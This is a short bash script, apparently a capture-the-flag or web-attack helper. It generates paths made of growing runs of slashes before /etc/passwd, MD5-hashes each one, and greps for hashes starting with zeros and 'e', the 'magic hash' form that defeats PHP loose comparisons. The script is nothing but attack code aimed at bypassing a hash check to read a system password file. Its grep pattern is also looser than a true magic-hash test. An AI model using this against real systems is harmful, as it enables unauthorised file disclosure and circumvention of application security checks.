#!/bin/bash

prefix="/"
for i in {1..1000}
do
   prefix="$prefix/"
   printf "$prefix/etc/passwd" | md5sum | grep -E "^0+e"
   echo "$prefix/etc/passwd"
done